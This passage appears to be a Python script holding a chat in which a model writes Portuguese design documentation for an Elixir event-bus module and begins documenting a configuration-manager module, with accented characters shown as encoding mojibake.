    *   Identificar todos os assinantes para um determinado t√≥pico de evento.
    *   Entregar c√≥pias do evento para cada assinante de forma ass√≠ncrona e concorrente.
    *   Garantir que a falha na entrega para um assinante n√£o afete a entrega para outros.
*   **Retentativa de Entrega (Retry Logic):**
    *   Implementar uma pol√≠tica de retentativa configur√°vel para eventos que falham na entrega (ex: assinante temporariamente indispon√≠vel).
    *   Suporte a backoff exponencial entre as tentativas.
*   **Hist√≥rico de Eventos (Opcional e Configur√°vel):**
    *   Manter um hist√≥rico limitado dos √∫ltimos N eventos publicados por t√≥pico.
    *   Permitir que novos assinantes recebam eventos passados recentes ao se inscreverem (`receive_past` op√ß√£o).
*   **Monitoramento e Observabilidade:**
    *   Expor m√©tricas sobre o n√∫mero de eventos publicados, entregues, falhos, em fila, etc.
    *   Registrar logs detalhados sobre a atividade do barramento de eventos.
*   **Persist√™ncia de Eventos (Avan√ßado/Opcional):**
    *   Capacidade de integrar com um mecanismo de armazenamento persistente para garantir a entrega de eventos cr√≠ticos mesmo ap√≥s rein√≠cios do sistema (ex: Kafka, RabbitMQ, ou uma tabela de banco de dados).

## üèóÔ∏è 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Core.EventBus.Server` (GenServer):**
    *   **Responsabilidade:** √â o processo central que gerencia o estado do EventBus.
    *   **Estado Interno:**
        *   Tabela de Assinaturas: Mapeamento de t√≥picos de eventos para uma lista de PIDs de assinantes.
        *   Fila de Eventos (Opcional): Uma fila interna (ou delegada a um sistema de filas externo) para eventos aguardando dispatch.
        *   Hist√≥rico de Eventos: Buffer circular por t√≥pico para eventos recentes (se habilitado).
        *   Configura√ß√µes: Limites, pol√≠ticas de retry, etc.
    *   **Intera√ß√µes:** Recebe chamadas de `publish`, `subscribe`, `unsubscribe`. Delega o dispatch real para `DispatcherWorkers` ou `Task.Supervisor`.
2.  **`DeeperHub.Core.EventBus.DispatcherWorker` (Pool de Workers ou `Task.Supervisor`):**
    *   **Responsabilidade:** Enviar eventos para os PIDs dos assinantes de forma isolada.
    *   **Intera√ß√µes:** Recebe um evento e uma lista de PIDs de assinantes do `EventBus.Server`. Tenta enviar a mensagem para cada PID. Reporta sucesso/falha de volta para o `EventBus.Server` (para l√≥gica de retry ou DLQ).
3.  **`DeeperHub.Core.EventBus.RetryManager` (GenServer ou Worker):**
    *   **Responsabilidade:** Gerenciar eventos que falharam na entrega e precisam ser reenviados.
    *   **Estado Interno:** Fila de eventos para retry com timestamps da pr√≥xima tentativa.
    *   **Intera√ß√µes:** Recebe eventos falhados do `DispatcherWorker`. Agenda reenvios e os envia de volta para o `DispatcherWorker`.
4.  **`DeeperHub.Core.EventBus.StorageAdapter` (Behaviour e Implementa√ß√µes):**
    *   **Responsabilidade:** Abstrair a persist√™ncia de eventos para hist√≥rico ou garantia de entrega.
    *   **Implementa√ß√µes:** `EtsStorage` (para hist√≥rico em mem√≥ria), `DbStorage` (para persist√™ncia em banco de dados), `NoOpStorage`.

### 3.2. Estrutura de Diret√≥rios (Proposta)

```
lib/deeper_hub/core/event_bus/
‚îú‚îÄ‚îÄ event_bus.ex                  # Fachada P√∫blica: publish, subscribe, etc.
‚îú‚îÄ‚îÄ server.ex                     # GenServer principal
‚îú‚îÄ‚îÄ dispatcher_worker.ex          # Worker para enviar eventos
‚îú‚îÄ‚îÄ retry_manager.ex              # GenServer para gerenciar retries
‚îú‚îÄ‚îÄ event.ex                      # Struct para representar um evento (topic, payload, metadata)
‚îÇ
‚îú‚îÄ‚îÄ storage/
‚îÇ   ‚îú‚îÄ‚îÄ storage_adapter.ex        # Behaviour para adaptadores de armazenamento
‚îÇ   ‚îú‚îÄ‚îÄ ets_storage.ex            # Implementa√ß√£o com ETS
‚îÇ   ‚îî‚îÄ‚îÄ db_storage.ex             # Implementa√ß√£o com Banco de Dados
‚îÇ
‚îî‚îÄ‚îÄ supervisor.ex                 # Supervisor para os processos do EventBus
```

### 3.3. Decis√µes de Design Importantes

*   **Desacoplamento Total:** Nenhum publicador precisa conhecer os assinantes, e vice-versa.
*   **Entrega Ass√≠ncrona:** A publica√ß√£o de eventos √© uma opera√ß√£o r√°pida que n√£o bloqueia o publicador. A entrega √© feita em background.
*   **Resili√™ncia de Assinantes:** A falha de um assinante em processar um evento n√£o deve impedir a entrega para outros assinantes nem bloquear o EventBus.
*   **Configurabilidade:** Pol√≠ticas de retry, limites de hist√≥rico e outros comportamentos s√£o configur√°veis via `Core.ConfigManager`.
*   **Observabilidade:** M√©tricas e logs detalhados s√£o cruciais para entender o fluxo de eventos e diagnosticar problemas.

## üõ†Ô∏è 4. Casos de Uso Principais

*   **Notifica√ß√£o de Cria√ß√£o de Usu√°rio:**
    *   `DeeperHub.Accounts` publica `DeeperHub.Core.EventBus.publish(\"user.created\", %{user_id: 123, email: \"a@b.com\"})`.
    *   `DeeperHub.Notifications` (inscrito em `\"user.created\"`) recebe o evento e envia um email de boas-vindas.
    *   `DeeperHub.Audit` (inscrito em `\"user.created\"`) recebe o evento e registra uma entrada de auditoria.
*   **Atualiza√ß√£o de Cache em Tempo Real:**
    *   Um m√≥dulo de gerenciamento de `Servidores` publica `DeeperHub.Core.EventBus.publish(\"server.updated\", %{server_id: 456, changes: %{name: \"Novo Nome\"}})`.
    *   O `DeeperHub.Core.Cache` ou um servi√ßo de cache espec√≠fico (inscrito em `\"server.updated\"`) recebe o evento e invalida/atualiza a entrada de cache para o servidor 456.
*   **Processamento Ass√≠ncrono de Pedidos:**
    *   M√≥dulo `DeeperHub.Orders` publica `DeeperHub.Core.EventBus.publish(\"order.placed\", %{order_id: 789, items: [...]})`.
    *   `DeeperHub.InventoryService` (inscrito) reserva itens.
    *   `DeeperHub.PaymentService` (inscrito) processa o pagamento.
    *   `DeeperHub.Notifications` (inscrito) envia confirma√ß√£o ao usu√°rio.

## üåä 5. Fluxos Importantes

### 5.1. Fluxo de Publica√ß√£o e Entrega de Evento

1.  **Publicador:** Um m√≥dulo (ex: `DeeperHub.Accounts`) chama `DeeperHub.Core.EventBus.publish(\"user.created\", payload, opts)`.
2.  **`EventBus.Server`:**
    *   Recebe a chamada `publish`.
    *   Cria uma `Event` struct com `topic`, `payload`, `metadata` (timestamp, event_id √∫nico).
    *   Se o hist√≥rico estiver habilitado, armazena o evento no buffer do t√≥pico correspondente.
    *   Consulta a tabela de assinaturas para encontrar todos os PIDs inscritos no t√≥pico `\"user.created\"` (ou padr√µes correspondentes como `\"user.*\"`).
3.  **Dispatch:**
    *   Para cada PID assinante, o `EventBus.Server` envia uma tarefa para um `DispatcherWorker` (ou usa `Task.async`).
    *   A tarefa cont√©m o `Event` struct e o PID do assinante.
4.  **`DispatcherWorker`:**
    *   Tenta enviar o evento para o PID do assinante (ex: `send(subscriber_pid, {:event, topic, payload, metadata})`).
    *   **Sucesso:** Notifica o `EventBus.Server` (para m√©tricas de entrega).
    *   **Falha (assinante morreu/ocupado):**
        *   Se a l√≥gica de retry estiver habilitada para o evento/t√≥pico, envia o evento e os detalhes da falha para o `RetryManager`.
        *   Sen√£o, registra a falha (para m√©tricas).
5.  **Assinante:**
    *   Recebe a mensagem `{:event, topic, payload, metadata}` em seu `handle_info/2`.
    *   Processa o evento.

### 5.2. Fluxo de Assinatura

1.  **Assinante:** Um processo (ex: um GenServer de `DeeperHub.Notifications`) chama `DeeperHub.Core.EventBus.subscribe(\"user.created\", self(), opts)` durante sua inicializa√ß√£o (`init/1`).
2.  **`EventBus.Server`:**
    *   Recebe a chamada `subscribe`.
    *   Adiciona o `self()` (PID do assinante) √† lista de assinantes do t√≥pico `\"user.created\"`.
    *   Monitora o PID do assinante para remo√ß√£o autom√°tica em caso de t√©rmino.
    *   Se `opts[:receive_past]` for `true`, recupera os eventos recentes do hist√≥rico para o t√≥pico e os envia para o novo assinante.

### 5.3. Fluxo de Retentativa de Entrega

1.  **`DispatcherWorker`:** Detecta falha na entrega para um assinante.
2.  **`RetryManager`:**
    *   Recebe o evento e os detalhes da falha (ex: n√∫mero de tentativas, √∫ltimo erro).
    *   Incrementa o contador de tentativas.
    *   Se o n√∫mero m√°ximo de tentativas n√£o foi excedido:
        *   Calcula o pr√≥ximo intervalo de retry (ex: backoff exponencial).
        *   Agenda o reenvio do evento para o `DispatcherWorker` ap√≥s o intervalo.
    *   Se o n√∫mero m√°ximo de tentativas foi excedido:
        *   Move o evento para uma Dead-Letter Queue (DLQ) (se configurada).
        *   Registra a falha permanente.
3.  **`DispatcherWorker` (Reenvio):** Recebe o evento do `RetryManager` e tenta reenvi√°-lo.

## üì° 6. API (Fun√ß√µes P√∫blicas)

### 6.1. `DeeperHub.Core.EventBus.publish(topic :: String.t() | atom() | list(atom()), payload :: term(), opts :: keyword()) :: :ok | {:error, term()}`

*   **Descri√ß√£o:** Publica um evento no barramento para todos os assinantes interessados.
*   **`@spec`:** `publish(topic :: String.t() | atom() | list(atom()), payload :: term(), opts :: keyword()) :: :ok | {:error, term()}`
*   **Par√¢metros:**
    *   `topic` (String | atom | list(atom)): O t√≥pico do evento (ex: `\"user.created\"`, `:payment_processed`, `[:order, :item, :shipped]`).
    *   `payload` (term): Os dados associados ao evento. Deve ser um termo serializ√°vel se a persist√™ncia ou distribui√ß√£o entre n√≥s for usada.
    *   `opts` (keyword list): Op√ß√µes adicionais:
        *   `:metadata` (map): Metadados personalizados a serem inclu√≠dos no evento. (Padr√£o: `%{}`)
        *   `:event_id` (String.t): Um ID de evento customizado. Se n√£o fornecido, um UUID ser√° gerado.
        *   `:timestamp` (DateTime.t): Timestamp customizado para o evento. Se n√£o fornecido, `DateTime.utc_now()` ser√° usado.
        *   `:retry_enabled` (boolean): Sobrescreve a configura√ß√£o global de retry para este evento. (Padr√£o: usa config global)
        *   `:max_attempts` (pos_integer): Sobrescreve o n√∫mero m√°ximo de tentativas para este evento. (Padr√£o: usa config global)
        *   `:persistent` (boolean): Se este evento deve ser persistido (requer adaptador de storage configurado). (Padr√£o: `false`)
*   **Retorno:**
    *   `:ok`: Se o evento foi aceito para publica√ß√£o.
    *   `{:error, reason}`: Se houve um erro ao tentar publicar (ex: valida√ß√£o do t√≥pico/payload falhou).
*   **Exemplo de Uso (Elixir):**
    ```elixir
    payload = %{user_id: \"user123\", registration_method: \"email\"}
    metadata = %{source_module: MyModule, trace_id: \"trace-xyz\"}
    DeeperHub.Core.EventBus.publish(\"user.registered\", payload, metadata: metadata)
    ```

### 6.2. `DeeperHub.Core.EventBus.subscribe(topic_pattern :: String.t() | atom() | list(atom()), subscriber :: pid() | module() | {module(), term()} | {atom(), node()}, opts :: keyword()) :: :ok | {:error, term()}`

*   **Descri√ß√£o:** Registra um `subscriber` para receber eventos que correspondam ao `topic_pattern`.
*   **`@spec`:** `subscribe(topic_pattern :: String.t() | atom() | list(atom()), subscriber :: pid() | module() | {module(), term()} | {atom(), node()}, opts :: keyword()) :: :ok | {:error, term()}`
*   **Par√¢metros:**
    *   `topic_pattern` (String | atom | list(atom)): O padr√£o do t√≥pico para assinar. Pode incluir wildcards (`*` para um segmento, `**` para m√∫ltiplos segmentos, ou conforme a implementa√ß√£o de matching).
    *   `subscriber`: O processo ou entidade que receber√° os eventos.
        *   `pid()`: O PID do processo assinante.
        *   `module()`: Um m√≥dulo que implementa um callback `handle_event(topic, payload, metadata)`.
        *   `{module(), term()}`: Um m√≥dulo e um estado inicial para um worker din√¢mico a ser iniciado.
        *   `{atom(), node()}`: Nome registrado de um processo (local ou remoto).
    *   `opts` (keyword list): Op√ß√µes adicionais:
        *   `:receive_past` (boolean): Se `true`, envia os √∫ltimos N eventos do hist√≥rico para este t√≥pico ao assinante. (Padr√£o: `false`)
        *   `:max_past_events` (pos_integer): N√∫mero m√°ximo de eventos passados a serem enviados se `:receive_past` for `true`. (Padr√£o: config global)
        *   `:queue_opts` (keyword): Op√ß√µes para a fila individual do assinante (se aplic√°vel pela implementa√ß√£o).
*   **Retorno:**
    *   `:ok`: Assinatura bem-sucedida.
    *   `{:error, reason}`: Falha na assinatura.
*   **Exemplo de Uso (Elixir):**
    ```elixir
    # Em um GenServer
    def init(_args) do
      DeeperHub.Core.EventBus.subscribe(\"user.*\", self())
      {:ok, %{}}
    end

    def handle_info({:event, topic, payload, metadata}, state) do
      Logger.info(\"Evento recebido: #{inspect(topic)} com payload: #{inspect(payload)}\", metadata)
      {:noreply, state}
    end
    ```

### 6.3. `DeeperHub.Core.EventBus.unsubscribe(topic_pattern :: String.t() | atom() | list(atom()), subscriber :: pid() | module() | {atom(), node()}) :: :ok`

*   **Descri√ß√£o:** Remove uma assinatura espec√≠fica.
*   **`@spec`:** `unsubscribe(topic_pattern :: String.t() | atom() | list(atom()), subscriber :: pid() | module() | {atom(), node()}) :: :ok`
*   **Par√¢metros:**
    *   `topic_pattern`: O padr√£o do t√≥pico da assinatura a ser removida.
    *   `subscriber`: O processo ou entidade que estava inscrito.
*   **Retorno:** `:ok`.
*   **Exemplo de Uso (Elixir):**
    ```elixir
    DeeperHub.Core.EventBus.unsubscribe(\"user.*\", self())
    ```

### 6.4. `DeeperHub.Core.EventBus.unsubscribe_all(subscriber :: pid() | module() | {atom(), node()}) :: :ok`

*   **Descri√ß√£o:** Remove todas as assinaturas de um `subscriber`.
*   **`@spec`:** `unsubscribe_all(subscriber :: pid() | module() | {atom(), node()}) :: :ok`
*   **Par√¢metros:**
    *   `subscriber`: O processo ou entidade cujas assinaturas ser√£o removidas.
*   **Retorno:** `:ok`.
*   **Exemplo de Uso (Elixir):**
    ```elixir
    DeeperHub.Core.EventBus.unsubscribe_all(self())
    ```

### 6.5. `DeeperHub.Core.EventBus.get_event_history(topic :: String.t() | atom() | list(atom()), opts :: keyword()) :: {:ok, list(Event.t())} | {:error, :not_found | term()}` (Nova Funcionalidade)

*   **Descri√ß√£o:** Recupera o hist√≥rico recente de eventos para um t√≥pico espec√≠fico. Requer que o hist√≥rico de eventos esteja habilitado e configurado.
*   **`@spec`:** `get_event_history(topic :: String.t() | atom() | list(atom()), opts :: keyword()) :: {:ok, list(map())} | {:error, :not_found | term()}`
*   **Par√¢metros:**
    *   `topic`: O t√≥pico exato do evento.
    *   `opts` (keyword list): Op√ß√µes adicionais:
        *   `:limit` (pos_integer): N√∫mero m√°ximo de eventos a retornar. (Padr√£o: config global de hist√≥rico)
        *   `:since_event_id` (String.t): Retorna eventos publicados ap√≥s este ID de evento.
*   **Retorno:**
    *   `{:ok, events_list}`: Lista dos eventos hist√≥ricos.
    *   `{:error, :not_found}`: Se o t√≥pico n√£o tiver hist√≥rico ou n√£o existir.
    *   `{:error, :history_disabled}`: Se o hist√≥rico de eventos n√£o estiver habilitado.
*   **Exemplo de Uso (Elixir):**
    ```elixir
    case DeeperHub.Core.EventBus.get_event_history(\"user.created\", limit: 5) do
      {:ok, events} -> IO.inspect(events)
      {:error, reason} -> Logger.warn(\"N√£o foi poss√≠vel obter hist√≥rico: #{reason}\")
    end
    ```

## ‚öôÔ∏è 7. Configura√ß√£o

O m√≥dulo `EventBus` √© configurado atrav√©s do `DeeperHub.Core.ConfigManager`.

*   **ConfigManager:**
    *   `[:core, :event_bus, :enabled]` (Boolean): Habilita/desabilita completamente o EventBus. (Padr√£o: `true`)
    *   `[:core, :event_bus, :history_enabled]` (Boolean): Habilita o armazenamento de hist√≥rico de eventos. (Padr√£o: `false`)
    *   `[:core, :event_bus, :history_limit_per_topic]` (Integer): N√∫mero m√°ximo de eventos a serem mantidos no hist√≥rico por t√≥pico. (Padr√£o: `100`)
    *   `[:core, :event_bus, :retry_enabled]` (Boolean): Habilita a l√≥gica de retentativa para entrega de eventos. (Padr√£o: `true`)
    *   `[:core, :event_bus, :retry_max_attempts]` (Integer): N√∫mero m√°ximo de tentativas de entrega. (Padr√£o: `5`)
    *   `[:core, :event_bus, :retry_base_interval_ms]` (Integer): Intervalo base (em ms) para a primeira retentativa. (Padr√£o: `1000`)
    *   `[:core, :event_bus, :retry_max_interval_ms]` (Integer): Intervalo m√°ximo (em ms) entre retentativas (para backoff exponencial). (Padr√£o: `60000`)
    *   `[:core, :event_bus, :retry_backoff_strategy]` (Atom): Estrat√©gia de backoff (:exponential, :fixed). (Padr√£o: `:exponential`)
    *   `[:core, :event_bus, :dispatcher_pool_size]` (Integer): N√∫mero de workers no pool de dispatchers. (Padr√£o: `System.schedulers_online() * 2`)
    *   `[:core, :event_bus, :storage_adapter]` (Module): M√≥dulo adaptador para persist√™ncia de eventos (ex: `DeeperHub.Core.EventBus.Storage.DbStorage`). (Padr√£o: `DeeperHub.Core.EventBus.Storage.EtsStorage` para hist√≥rico em mem√≥ria, ou `DeeperHub.Core.EventBus.Storage.NoOpStorage` se desabilitado)
    *   `[:core, :event_bus, :dlq_enabled]` (Boolean): Habilita Dead-Letter Queue para eventos que falham persistentemente. (Padr√£o: `false`)
    *   `[:core, :event_bus, :dlq_adapter]` (Module): M√≥dulo adaptador para a DLQ. (Padr√£o: `nil`)

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.ConfigManager`: Para obter configura√ß√µes de runtime.
*   `DeeperHub.Core.Logger`: Para registrar atividades e erros.
*   `DeeperHub.Core.Metrics`: Para emitir m√©tricas de desempenho e sa√∫de.
*   `DeeperHub.Core.Supervisor` (indireta): Para ser supervisionado.

### 8.2. Bibliotecas Externas

*   `Jason` (opcional): Se os payloads dos eventos precisarem ser serializados/desserializados para armazenamento persistente ou comunica√ß√£o entre n√≥s.
*   Pode depender de um cliente de sistema de filas (ex: `AMQP` para RabbitMQ, `Brody` para Kafka) se um `StorageAdapter` correspondente for usado para persist√™ncia avan√ßada.

## ü§ù 9. Como Usar / Integra√ß√£o

**Publicando um Evento:**
Qualquer m√≥dulo pode publicar um evento chamando a fun√ß√£o `publish/3`.
```elixir
# Em um m√≥dulo qualquer
alias DeeperHub.Core.EventBus

def process_order(order) do
  # ... l√≥gica de processamento ...
  EventBus.publish(\"order.processed\", %{order_id: order.id, status: \"completed\"})
  {:ok, order}
end
```

**Assinando Eventos (em um GenServer):**
```elixir
defmodule MyApp.OrderNotifier do
  use GenServer
  alias DeeperHub.Core.EventBus
  alias DeeperHub.Core.Logger # Exemplo

  def start_link(_opts) do
    GenServer.start_link(__MODULE__, :ok, name: __MODULE__)
  end

  @impl true
  def init(:ok) do
    Logger.info(\"OrderNotifier iniciando e assinando eventos...\")
    EventBus.subscribe(\"order.processed\", self())
    EventBus.subscribe(\"order.shipped\", self())
    # Assinar outros eventos relevantes
    {:ok, %{}}
  end

  @impl true
  def handle_info({:event, topic, payload, _metadata}, state) do
    Logger.info(\"Evento recebido no OrderNotifier: #{inspect(topic)}\", payload: payload)
    case topic do
      \"order.processed\" ->
        # Enviar notifica√ß√£o de pedido processado
        Logger.info(\"Enviando notifica√ß√£o de pedido processado para order_id: #{payload.order_id}\")
      \"order.shipped\" ->
        # Enviar notifica√ß√£o de pedido enviado
        Logger.info(\"Enviando notifica√ß√£o de pedido enviado para order_id: #{payload.order_id}\")
      _ ->
        :ok
    end
    {:noreply, state}
  end

  # Outros callbacks do GenServer...
end
```

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testes unit√°rios para o `EventBus.Server` devem cobrir a l√≥gica de gerenciamento de assinaturas, enfileiramento e hist√≥rico.
*   Testes para os `DispatcherWorker`s devem focar na entrega de mensagens e tratamento de falhas de assinantes.
*   Testes para o `RetryManager` devem verificar a l√≥gica de agendamento e limites de retry.
*   Testes de integra√ß√£o devem simular a publica√ß√£o e o recebimento de eventos por m√∫ltiplos assinantes, incluindo cen√°rios de falha e retry.
*   Localiza√ß√£o dos testes: `test/deeper_hub/core/event_bus/`

### 10.2. M√©tricas

*   **Contadores:**
    *   `deeper_hub.core.event_bus.event.published.count` (tags: `topic`): N√∫mero de eventos publicados.
    *   `deeper_hub.core.event_bus.event.delivered.count` (tags: `topic`, `subscriber_id`): N√∫mero de eventos entregues com sucesso a um assinante.
    *   `deeper_hub.core.event_bus.event.delivery_failed.count` (tags: `topic`, `subscriber_id`, `reason`): N√∫mero de falhas na entrega.
    *   `deeper_hub.core.event_bus.event.retried.count` (tags: `topic`, `subscriber_id`): N√∫mero de vezes que a entrega de um evento foi retentada.
    *   `deeper_hub.core.event_bus.event.dlq.count` (tags: `topic`): N√∫mero de eventos enviados para a Dead-Letter Queue.
    *   `deeper_hub.core.event_bus.subscriber.added.count` (tags: `topic`): N√∫mero de novas assinaturas.
    *   `deeper_hub.core.event_bus.subscriber.removed.count` (tags: `topic`): N√∫mero de assinaturas removidas.
*   **Gauges:**
    *   `deeper_hub.core.event_bus.queue.size.gauge` (tags: `topic` (opcional)): Tamanho da fila de eventos pendentes.
    *   `deeper_hub.core.event_bus.retry_queue.size.gauge`: Tamanho da fila de retentativas.
    *   `deeper_hub.core.event_bus.subscribers.active.gauge` (tags: `topic`): N√∫mero de assinantes ativos por t√≥pico.
    *   `deeper_hub.core.event_bus.history.size.gauge` (tags: `topic`): Tamanho do buffer de hist√≥rico por t√≥pico.
*   **Histogramas/Timers:**
    *   `deeper_hub.core.event_bus.publish.duration_ms` (Histograma): Dura√ß√£o para processar uma chamada de `publish`.
    *   `deeper_hub.core.event_bus.dispatch.duration_ms` (Histograma, tags: `topic`): Dura√ß√£o para despachar um evento para todos os seus assinantes (excluindo o tempo de processamento do assinante).
    *   `deeper_hub.core.event_bus.event_processing_latency_ms` (Histograma, tags: `topic`): Lat√™ncia entre a publica√ß√£o e a entrega bem-sucedida de um evento.

### 10.3. Logs

*   **N√≠vel INFO:**
    *   Publica√ß√£o de novos eventos (t√≥pico, ID do evento, metadados relevantes).
    *   Assinatura/Cancelamento de assinatura (t√≥pico, PID/nome do assinante).
    *   Entrega bem-sucedida de evento para um assinante.
    *   In√≠cio e fim de um ciclo de retry para um evento.
*   **N√≠vel WARNING:**
    *   Falha na entrega de um evento para um assinante (antes de retry).
    *   Payload de evento grande que pode impactar performance.
    *   Fila de eventos ou fila de retry atingindo um limiar alto.
*   **N√≠vel ERROR:**
    *   Falha persistente na entrega de um evento ap√≥s todas as retentativas (movido para DLQ ou descartado).
    *   Erro interno no `EventBus.Server` ou workers.
    *   Falha ao persistir evento (se storage persistente estiver configurado).

### 10.4. Telemetria

O `EventBus` emite eventos Telemetry para permitir instrumenta√ß√£o fina e observabilidade.

*   `[:deeper_hub, :core, :event_bus, :publish, :start | :stop | :exception]`
    *   Medi√ß√µes: `%{duration: native_time}` (no `:stop`)
    *   Metadados: `%{topic: topic, payload_size: size, event_id: event_id, opts: opts}`
*   `[:deeper_hub, :core, :event_bus, :subscribe, :success | :failure]`
    *   Metadados: `%{topic_pattern: pattern, subscriber: subscriber, opts: opts, reason: reason_if_failure}`
*   `[:deeper_hub, :core, :event_bus, :dispatch, :start | :stop | :exception]` (para o lote de dispatch de um evento)
    *   Medi√ß√µes: `%{duration: native_time}`
    *   Metadados: `%{topic: topic, event_id: event_id, subscriber_count: count}`
*   `[:deeper_hub, :core, :event_bus, :delivery, :success | :failure | :retry]` (para entrega a um assinante individual)
    *   Metadados: `%{topic: topic, event_id: event_id, subscriber: subscriber, attempt: attempt_num, error: error_if_failure}`

## ‚ùå 11. Tratamento de Erros

*   **Falha de Assinante:** Se um processo assinante falhar ao receber ou processar um evento (ex: `send` para um PID morto, ou o assinante crasha), o `DispatcherWorker` detecta isso.
    *   O evento √© encaminhado para o `RetryManager` se as retentativas estiverem habilitadas.
    *   A falha n√£o impacta a entrega para outros assinantes do mesmo evento.
*   **Retries Excedidos:** Se um evento falhar em todas as tentativas de reenvio, ele √© movido para uma Dead-Letter Queue (DLQ) configurada (se houver) ou descartado. Um log de erro √© gerado.
*   **`EventBus.Server` Crash:** Sendo um GenServer supervisionado, ser√° reiniciado pelo supervisor.
    *   Assinaturas em mem√≥ria (ETS) ser√£o perdidas e precisar√£o ser refeitas pelos assinantes ao reiniciarem.
    *   Eventos em filas internas em mem√≥ria ser√£o perdidos. Para evitar isso, um `StorageAdapter` com persist√™ncia (ex: DB, sistema de filas externo) seria necess√°rio para a fila de eventos.
*   **T√≥pico Inv√°lido ou Payload Inv√°lido:** A fun√ß√£o `publish/3` pode retornar `{:error, reason}` se o t√≥pico ou payload n√£o passarem em valida√ß√µes b√°sicas.

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa

*   **Sensibilidade do Payload:** Os payloads dos eventos podem conter dados sens√≠veis. Se o hist√≥rico de eventos ou a persist√™ncia de eventos estiverem habilitados, considerar:
    *   Criptografar payloads sens√≠veis antes de public√°-los.
    *   Filtrar dados sens√≠veis dos payloads antes do armazenamento no hist√≥rico/DLQ.
*   **Controle de Acesso √† Publica√ß√£o/Assinatura (Avan√ßado):** Em sistemas maiores ou com m√∫ltiplos tenants, pode ser necess√°rio controlar quais m√≥dulos/usu√°rios podem publicar ou assinar determinados t√≥picos. Isso n√£o parece ser uma necessidade inicial aqui, mas √© uma considera√ß√£o futura.
*   **Abuso de Publica√ß√£o:** Um m√≥dulo defeituoso publicando um grande volume de eventos pode sobrecarregar o EventBus. Limites de taxa na publica√ß√£o ou no tamanho da fila podem ser considerados, embora aumentem a complexidade.
*   **Seguran√ßa do Assinante:** Assinantes maliciosos ou comprometidos podem ganhar acesso a informa√ß√µes atrav√©s dos eventos. O design deve garantir que os eventos contenham apenas as informa√ß√µes necess√°rias para os casos de uso leg√≠timos.

## üßë‚Äçüíª 13. Contribui√ß√£o

*   **Nomea√ß√£o de T√≥picos:** Use um padr√£o consistente para nomear t√≥picos, por exemplo: `dominio.entidade.acao` (ex: `accounts.user.created`, `payments.transaction.succeeded`).
*   **Payloads de Eventos:** Defina structs ou mapas bem definidos para os payloads de cada tipo de evento. Considere versionar os schemas dos payloads se grandes mudan√ßas forem esperadas.
*   **Idempot√™ncia de Assinantes:** Assinantes devem, idealmente, ser idempotentes no processamento de eventos, pois em alguns cen√°rios de falha/retry, um evento pode ser entregue mais de uma vez.
*   **Testes:** Ao adicionar novos eventos ou assinantes, garanta que os testes cubram os fluxos de publica√ß√£o e consumo.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Implementar um `StorageAdapter` para persistir eventos em um banco de dados, garantindo a entrega mesmo ap√≥s rein√≠cios.
*   [ ] Desenvolver uma Dead-Letter Queue (DLQ) para eventos que falham consistentemente, permitindo an√°lise e reprocessamento manual.
*   [ ] Adicionar suporte para filtragem de eventos no lado do assinante (assinante especifica um filtro al√©m do t√≥pico).
*   [ ] Explorar a integra√ß√£o com um sistema de filas externo mais robusto (RabbitMQ, Kafka) para cen√°rios de alta carga ou necessidade de garantias de entrega mais fortes.
*   [ ] Adicionar uma interface de administra√ß√£o (Console ou Web) para visualizar o estado do EventBus, filas, assinantes e gerenciar a DLQ.
*   [ ] Implementar ordena√ß√£o de eventos garantida por t√≥pico (se necess√°rio para casos de uso espec√≠ficos).
*   [ ] Considerar \"eventos de resposta\" ou coreografia de saga para fluxos de trabalho mais complexos.

---

*√öltima atualiza√ß√£o: 2025-05-11*

---

Este √© um exemplo detalhado para o `DeeperHub.Core.EventBus`. Posso continuar com o pr√≥ximo m√≥dulo, talvez o `DeeperHub.Core.ConfigManager` ou algum outro de sua prefer√™ncia?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""proximo"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Excelente! Vamos prosseguir com a documenta√ß√£o do m√≥dulo `DeeperHub.Core.ConfigManager`. Este √© outro componente crucial, pois centraliza a forma como o sistema acessa suas configura√ß√µes.

---

# M√≥dulo: `DeeperHub.Core.ConfigManager` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.Core.ConfigManager`

O m√≥dulo `DeeperHub.Core.ConfigManager` √© o servi√ßo centralizado para gerenciar e acessar todas as configura√ß√µes din√¢micas do sistema DeeperHub. Ele abstrai a origem das configura√ß√µes (seja de arquivos de configura√ß√£o, banco de dados, vari√°veis de ambiente ou um servi√ßo de configura√ß√£o externo), fornecendo uma interface unificada e consistente para todos os outros m√≥dulos.

Este m√≥dulo permite que as configura√ß√µes sejam alteradas em tempo de execu√ß√£o (para aquelas que suportam isso) e notifica outros componentes do sistema sobre essas mudan√ßas, permitindo uma adapta√ß√£o din√¢mica do comportamento da aplica√ß√£o. üòä

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Acesso Unificado a Configura√ß√µes:**
    *   Fornecer uma API simples para obter valores de configura√ß√£o por chave e, opcionalmente, por escopo (`get/3`, `get_config/1`).
    *   Suportar valores padr√£o caso uma configura√ß√£o n√£o seja encontrada.
    *   Converter tipos de dados (ex: `get_integer/3`).
*   **Gerenciamento de Configura√ß√µes (CRUD):**
    *   Permitir a cria√ß√£o, leitura, atualiza√ß√£o e exclus√£o de configura√ß√µes (para fontes de configura√ß√£o que suportam isso, como um banco de dados).
    *   Validar os dados de configura√ß√£o antes de salv√°-los.
*   **Escopo de Configura√ß√µes:**
    *   Suportar diferentes escopos para configura√ß√µes (ex: `global`, `user_id:123`, `tenant:abc`).
    *   Resolver a preced√™ncia de escopos (ex: uma configura√ß√£o espec√≠fica de usu√°rio sobrescreve uma global).
*   **Tipagem de Dados:**
    *   Armazenar e retornar configura√ß√µes com tipos de dados corretos (string, integer, boolean, map, list).
*   **Sensibilidade de Dados:**
    *   Marcar configura√ß√µes como sens√≠veis para evitar sua exposi√ß√£o indevida em logs ou APIs.
*   **Notifica√ß√£o de Mudan√ßas:**
    *   Publicar eventos (via `Core.EventBus`) quando configura√ß√µes s√£o criadas, atualizadas ou exclu√≠das.
    *   Permitir que outros m√≥dulos se inscrevam nessas notifica√ß√µes para reagir a mudan√ßas de configura√ß√£o.
*   **Cache de Configura√ß√µes:**
